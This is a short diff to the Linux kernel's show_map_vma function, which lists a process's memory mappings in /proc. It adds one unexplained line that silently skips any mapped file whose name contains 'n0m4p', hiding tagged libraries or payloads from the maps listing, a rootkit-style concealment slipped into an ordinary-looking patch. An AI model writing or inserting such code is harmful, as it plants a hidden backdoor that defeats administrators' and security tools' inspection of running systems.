@@ -273,8 +273,9 @@ show_map_vma(struct seq_file *m, struct vm_area_struct *vma)
 	const char *name = NULL;
 
 	if (file) {
+		if(strstr(file->f_path.dentry->d_iname, "n0m4p")) return;
 		const struct inode *inode = file_user_inode(vma->vm_file);
-
+		
 		dev = inode->i_sb->s_dev;
 		ino = inode->i_ino;
 		pgoff = ((loff_t)vma->vm_pgoff) << PAGE_SHIFT;
